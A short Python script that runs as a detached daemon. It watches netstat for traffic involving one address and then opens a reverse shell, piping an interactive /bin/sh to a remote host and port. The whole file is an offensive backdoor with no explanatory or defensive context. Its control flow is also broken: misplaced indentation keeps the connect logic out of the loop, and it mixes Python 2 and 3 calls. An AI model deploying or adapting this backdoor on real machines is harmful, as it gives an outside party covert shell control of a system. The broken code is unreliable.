#!/usr/bin/python  
 
import os  
import sys  
import socket  
import time  
 
def daemon ():  
    try:  
        pid = os.fork()  
        if pid > 0:  
            sys.exit(0)  
    except OSError as e:  
        print (sys.stderr, "fork #1 failed: %d (%s)" % (e.errno, e.strerror))  
        sys.exit(1)  
 
    os.chdir("/")  
    os.setsid()  
    os.umask(0)   
 
    try:  
        pid = os.fork()  
        if pid > 0:  
            print ("Daemon PID %d" % pid)  
            sys.exit(0)  
    except OSError as e:  
        print (sys.stderr, "fork #2 failed: %d (%s)" % (e.errno, e.strerror))
        sys.exit(1)   
 
def shell (host = '10.0.0.111', port = 1711):  
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    try:  
        s.connect((host, port))  
        f = s.fileno()  
        os.dup2(f, 0)  
        os.dup2(f, 1)  
        os.dup2(f, 2)  
        os.execl("/bin/sh", "sh", "-i")  
 
    except socket.error as e:  
        print ("connect error%d\n" % os.getpid() ) 
        time.sleep(10)  
 
    sys.exit(127)  
 
if __name__ == "__main__":  
    daemon()  
 
    while(True):  
        (cin, cout) = os.popen4("netstat -nt | grep 192.168.1.111")  
        str = cout.read()  
    try:  
        os.wait()  
    except OSError as e:  
        pass 
 
        if  str != '':  
            print (str)  
            try:  
                pid = os.fork()  
                if pid > 0:  
                    print ('parent wait:%d\n' % os.getpid() ) 
                    try:  
                        os.wait()  
                    except OSError as e:  
                        pass 
                else:  
                    print ('ready to connect:%d\n' % os.getpid()  )
                    shell()  
 
            except OSError as e:  
                sys.exit(1)  
        else:  
            print ("start sleep 5 mins:%d\n" % os.getpid())  
            time.sleep(10)